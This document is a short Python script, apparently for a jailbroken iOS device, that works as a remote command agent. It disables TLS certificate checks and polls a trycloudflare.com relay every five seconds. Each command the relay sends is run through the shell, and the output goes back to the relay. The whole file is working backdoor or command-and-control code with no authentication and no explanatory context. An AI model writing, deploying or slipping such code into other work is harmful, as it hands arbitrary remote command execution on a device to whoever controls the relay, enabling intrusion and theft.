import ssl, urllib.request, json, time, subprocess, os, sys, traceback
ssl._create_default_https_context = ssl._create_unverified_context
R = 'https://sampling-trustee-latest-prayer.trycloudflare.com'
os.environ['PATH'] = '/var/jb/usr/bin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/sbin:/var/jb/usr/local/bin'
print('[StarCore] poller starting...', flush=True)
try:
    req = urllib.request.Request(R + '/')
    resp = urllib.request.urlopen(req, timeout=15)
    print('[StarCore] relay connected!', flush=True)
except Exception as e:
    print(f'[StarCore] FATAL: cannot connect to relay: {e}', flush=True)
    sys.exit(1)

while True:
    try:
        req = urllib.request.Request(R + '/', data=b'', headers={'Content-Type':'application/json'})
        resp = urllib.request.urlopen(req, timeout=15)
        data = json.loads(resp.read())
        for cmd in data.get('commands', []):
            cid = cmd.get('id', 0)
            c = cmd.get('cmd', '')
            print(f'[exec] {c}', flush=True)
            r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30)
            out = (r.stdout or r.stderr or '(empty)')[:3000]
            result_data = json.dumps({'id': cid, 'result': out}).encode()
            urllib.request.urlopen(urllib.request.Request(R + '/result', data=result_data, headers={'Content-Type':'application/json'}), timeout=15)
            print(f'[done] id={cid}', flush=True)
    except Exception as e:
        print(f'[err] {e}', flush=True)
        traceback.print_exc()
    time.sleep(5)
